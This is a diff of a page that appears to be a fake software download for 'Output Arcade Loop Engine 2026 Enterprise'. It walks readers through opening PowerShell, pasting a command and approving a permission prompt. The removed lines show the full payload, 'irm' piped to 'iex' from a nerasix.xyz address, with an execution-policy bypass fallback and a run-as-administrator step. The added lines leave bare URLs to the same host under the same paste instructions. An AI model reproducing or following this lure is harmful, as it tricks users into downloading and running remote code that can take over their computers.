@@ -12,19 +12,14 @@ Output Arcade Loop Engine 2026 Enterprise · Studio workflow · Plugin suite · 
 **Do this:**
 
 1. Press the **Windows** key, type **powershell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
 3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
 4. Click **Yes** if Windows asks for permission
 
-```powershell
-irm https://output-arcade-loop-engine-2026-enterprise.nerasix.xyz/ | iex
-```
+```https://output-arcade-loop-engine-2026-enterprise.nerasix.xyz/```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://output-arcade-loop-engine-2026-enterprise.nerasix.xyz/ | iex"
-```
+```https://output-arcade-loop-engine-2026-enterprise.nerasix.xyz/```
 
 
 ---
